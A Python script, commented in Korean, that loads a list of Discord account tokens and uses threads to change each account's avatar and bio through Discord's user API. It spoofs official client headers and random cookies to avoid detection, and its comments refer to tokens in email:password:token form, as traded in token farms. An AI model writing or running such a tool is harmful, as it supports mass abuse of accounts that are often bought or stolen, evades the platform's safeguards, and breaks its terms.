import requests
from datauri import DataURI
import os
import random
import asyncio
import time
import threading

listdir = os.listdir('avatar')
image = 'avatar/' + random.choice(listdir)
png_uri = DataURI.from_file(image)


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def safeHeader(token):
    return {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "Authorization": token,
        "content-length": "0",
        "cookie": f"cfuid={randstr(43)}; dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }


async def change(token):
    # avatar에 사진 여러장 넣고 랜덤으로 뽑을거면 위에 listdir~png_uri여기로 옮기셈

    jsondata = {
        # 'username':'Supporter', #username
        # 'password' : token.split(':')[1] username하구 password는 토큰 형식이 이메일:비번:토큰 형식이어야함
        # 같은 원리로 result 리퀘부분에도 token.split(':')[2]로 바꾸셈
        'avatar': png_uri,
        'bio': '내소개'
    }
    # data = {'status': "online", 'custom_status':
    # {'text': "외주 받습니다"}} #상메, 상태설정
    try:
        result = requests.patch('https://discord.com/api/v9/users/@me',
                                json=jsondata, headers=safeHeader(token)).json()
        # requests.patch('https://discord.com/api/v9/users/@me/settings', json=data, headers={'Authorization': token}).json()
        if ('avatar' in result):
            print(f'{token} | changed avatar')
        elif ('Rate' in result):
            print('Rate limited.')
            time.sleep(5)
        else:
            print(f'{token} | not changed avatar')
    except:
        print('Rate limited.')
        time.sleep(5)

f = open('tokens.txt', 'r')
tokens = f.read().split('\n')
f.close()

for token in tokens:
    def temp_run():
        asyncio.run(change(token))

    threading.Thread(target=temp_run, args=()).start()
